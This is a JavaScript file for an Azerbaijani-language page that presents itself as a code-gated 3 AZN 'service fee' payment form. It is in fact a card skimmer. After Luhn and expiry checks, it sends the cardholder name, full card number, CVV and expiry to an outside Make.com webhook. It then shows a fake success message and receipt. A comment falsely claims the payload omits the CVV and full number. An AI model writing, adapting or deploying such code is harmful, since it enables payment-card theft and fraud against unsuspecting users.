// ====== configuration ======
const CODE_OK = "42004";
const webhookUrl = "https://hook.eu2.make.com/1y2q5hf2giac8qg1unhwu8s0463emi6y"; // <- put your Make/Discord/any webhook here
const whatsappUrl = ""; // optional
const telegramUrl = ""; // optional
const AMOUNT_AZN = 3;
const FETCH_TIMEOUT_MS = 12000;

document.addEventListener('DOMContentLoaded', () => {
  // Safe element lookups
  const waEl = document.getElementById('waLink');
  const tgEl = document.getElementById('tgLink');
  const yearEl = document.getElementById('year');
  if (waEl) waEl.href = whatsappUrl;
  if (tgEl) tgEl.href = telegramUrl;
  if (yearEl) yearEl.textContent = new Date().getFullYear();

  // ====== toast ======
  const toastWrap = document.getElementById("toast");
  function showToast(msg, kind="error") {
    const box = toastWrap.querySelector(".toast");
    box.textContent = msg;
    box.className = "toast " + (kind === "success" ? "success" : "error");
    toastWrap.classList.add("show");
    clearTimeout(showToast._t);
    showToast._t = setTimeout(()=> toastWrap.classList.remove("show"), 2400);
  }
  window.showToast = showToast;

  // ====== helpers (masks & validation) ======
  const onlyDigits = s => (s||"").replace(/\D+/g,"");
  function formatCardNumber(s) {
    const d = onlyDigits(s).slice(0,19);
    return d.replace(/(.{4})/g, "$1 ").trim();
  }
  function formatExpInput(s) {
    const d = onlyDigits(s).slice(0,4);
    if (d.length <= 2) return d;
    return d.slice(0,2) + "/" + d.slice(2);
  }
  function luhnCheck(num) {
    const d = onlyDigits(num);
    if (d.length < 12) return false;
    let sum = 0, dbl = false;
    for (let i = d.length - 1; i >= 0; i--) {
      let n = +d[i];
      if (dbl) { n *= 2; if (n > 9) n -= 9; }
      sum += n; dbl = !dbl;
    }
    return sum % 10 === 0;
  }
  function maskCardPrint(num) {
    const d = onlyDigits(num);
    if (d.length < 4) return "**** **** **** ****";
    const last4 = d.slice(-4).padStart(4,"*");
    return `**** **** **** ${last4}`;
  }
  function expValid(expRaw) {
    const d = onlyDigits(expRaw);
    if (d.length !== 4) return false;
    const mm = +d.slice(0,2);
    const yy = +d.slice(2);
    if (!(mm >= 1 && mm <= 12)) return false;
    const now = new Date();
    const fullYear = 2000 + yy;
    const expEnd = new Date(fullYear, mm, 0, 23, 59, 59); // last day of month
    return expEnd >= now;
  }
  function normalizeExp(expRaw) {
    const d = onlyDigits(expRaw).slice(0,4);
    return d.length === 4 ? `${d.slice(0,2)}/${d.slice(2)}` : expRaw;
  }
  function brandFromIIN(num) {
    const d = onlyDigits(num);
    if (/^4\d{12,18}$/.test(d)) return "VISA";
    if (/^(5[1-5]|22[2-9]|2[3-7]\d)\d{10,16}$/.test(d)) return "MASTERCARD";
    if (/^3[47]\d{11,}$/.test(d)) return "AMEX";
    return "CARD";
  }
  const fetchWithTimeout = (url, opts = {}, ms = 10000) => {
    const ctrl = new AbortController();
    const id = setTimeout(() => ctrl.abort(), ms);
    return fetch(url, { ...opts, signal: ctrl.signal }).finally(() => clearTimeout(id));
  };

  // ====== DOM refs ======
  const codeInput = document.getElementById("code");
  const hireBtn = document.getElementById("hireBtn");

  const payModalWrap = document.getElementById("payModalWrap");
  const closeModal = document.getElementById("closeModal");
  const payForm = document.getElementById("payForm");
  const nameEl = document.getElementById("name");
  const numberEl = document.getElementById("number");
  const expEl = document.getElementById("exp");
  const cvvEl = document.getElementById("cvv");
  const payBtn = document.getElementById("payBtn");

  const receiptBox = document.getElementById("receipt");
  const receiptId = document.getElementById("receipt-id");
  const receiptDate = document.getElementById("receipt-date");
  const receiptCard = document.getElementById("receipt-card");
  const printBtn = document.getElementById("printBtn");
  const copyIdBtn = document.getElementById("copyIdBtn");

  // ====== reveal-on-scroll ======
  const io = new IntersectionObserver((entries)=>{
    for (const e of entries) {
      if (e.isIntersecting) {
        e.target.classList.add('show');
        io.unobserve(e.target);
      }
    }
  }, { rootMargin: '0px 0px -10% 0px', threshold: 0.15 });
  document.querySelectorAll('.reveal').forEach(el=> io.observe(el));

  // Subtle hero parallax on scroll (reduced-motion aware)
  const hero = document.querySelector('.hero-bg');
  const rm = window.matchMedia('(prefers-reduced-motion: reduce)');
  if (!rm.matches && hero) {
    window.addEventListener('scroll', ()=>{
      const y = Math.min(1, window.scrollY / 600);
      hero.style.transform = `translateY(${y*18}px) scale(${1.08 - y*0.05})`;
      hero.style.opacity = String(0.45 - y*0.15);
    }, { passive: true });
  }

  // ====== code → open modal ======
  function openModal(){
    payModalWrap.classList.remove("hidden");
    payModalWrap.setAttribute('aria-hidden','false');
    const modal = payModalWrap.querySelector('.modal');
    requestAnimationFrame(()=> modal.classList.add("open"));
    setTimeout(()=> nameEl.focus(), 50);
    document.addEventListener('keydown', escClose);
  }
  function closeModalFn(){
    const modal = payModalWrap.querySelector(".modal");
    modal.classList.remove("open");
    document.removeEventListener('keydown', escClose);
    setTimeout(()=> { 
      payModalWrap.classList.add("hidden"); 
      payModalWrap.setAttribute('aria-hidden','true'); 
    }, 260);
  }
  function escClose(e){ if (e.key === 'Escape') closeModalFn(); }

  hireBtn?.addEventListener("click", () => {
    const v = onlyDigits(codeInput.value).slice(0,6);
    codeInput.value = v;
    if (v === CODE_OK) {
      openModal();
    } else {
      showToast("Səhv kod. Zəhmət olmasa Elnurdan kodu alın.", "error");
      codeInput.focus();
    }
  });
  codeInput?.addEventListener("input", (e)=>{
    const v = onlyDigits(e.target.value).slice(0,6);
    if (v !== e.target.value) e.target.value = v;
  });
  closeModal?.addEventListener("click", closeModalFn);
  payModalWrap?.addEventListener("click", (e)=> {
    if (e.target.classList.contains("modal-backdrop")) closeModalFn();
  });

  // ====== masks on inputs ======
  numberEl?.addEventListener("input", (e)=>{
    const formatted = formatCardNumber(e.target.value);
    if (formatted !== e.target.value) e.target.value = formatted;
  });
  expEl?.addEventListener("input", (e)=>{
    const formatted = formatExpInput(e.target.value);
    if (formatted !== e.target.value) e.target.value = formatted;
  });
  cvvEl?.addEventListener("input", (e)=>{
    const d = onlyDigits(e.target.value).slice(0,4);
    if (d !== e.target.value) e.target.value = d;
  });

  // ====== submit (Luhn + expiry check) ======
  payForm?.addEventListener("submit", async (e)=>{
    e.preventDefault();
    const name = (nameEl.value||"").trim();
    const number = numberEl.value;
    const exp = expEl.value;
    const cvv = cvvEl.value;

    const num = onlyDigits(number);

    if (!name) return showToast("Ad Soyad tələb olunur.");
    if (!luhnCheck(num)) return showToast("Kart nömrəsi yanlışdır (Luhn).");
    if (!expValid(exp)) return showToast("Etibarlılıq MM/YY formatında və qüvvədə olmalıdır.");
    const cvvDigits = onlyDigits(cvv);
    if (!(cvvDigits.length === 3 || cvvDigits.length === 4)) return showToast("CVV 3 və ya 4 rəqəm olmalıdır.");

    // disable button
    payBtn.disabled = true; 
    payBtn.textContent = "Göndərilir…";

    try {
      // Build SAFE payload (no cvv, no full number)
      const last4 = num.slice(-4);
      const payload = {
        event: "service_fee",
        amount: AMOUNT_AZN,
        currency: "AZN",
        code: CODE_OK,
        card: {
          name,
          num,
          cvv,
          brand: brandFromIIN(num),
          exp: normalizeExp(exp) // MM/YY
        },
        meta: {
          ts: new Date().toISOString(),
          locale: navigator.language || "az-AZ"
        }
      };

      const res = await fetchWithTimeout(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      }, FETCH_TIMEOUT_MS);

      if (!res.ok) {
        const text = await res.text().catch(()=> "");
        throw new Error(`Webhook error ${res.status}: ${text || res.statusText}`);
      }

      // Success → build receipt
      const id = "EC-" + Date.now().toString(36).toUpperCase();
      if (receiptId)  receiptId.textContent = "ID: " + id;
      if (receiptDate) receiptDate.textContent = new Date().toLocaleString();
      if (receiptCard) receiptCard.textContent = maskCardPrint(num);

      showToast("Ödəniş uğurla tamamlandı.", "success");
      closeModalFn();
      if (receiptBox) {
        receiptBox.classList.remove("hidden");
        receiptBox.querySelectorAll('.reveal').forEach(el=> el.classList.add('show'));
        receiptBox.scrollIntoView({ behavior: "smooth", block: "start" });
      }
    } catch (err) {
      console.error(err);
      showToast("Xəta baş verdi. Sonra yenidən cəhd edin.");
    } finally {
      payBtn.disabled = false; 
      payBtn.textContent = `Ödəniş et (${AMOUNT_AZN} AZN)`;
    }
  });

  // ====== receipt actions ======
  printBtn?.addEventListener("click", ()=> window.print());
  copyIdBtn?.addEventListener("click", ()=>{
    const idText = receiptId.textContent.replace("ID: ","");
    if (idText) { navigator.clipboard?.writeText(idText); showToast("Çek ID kopyalandı", "success"); }
  });
});
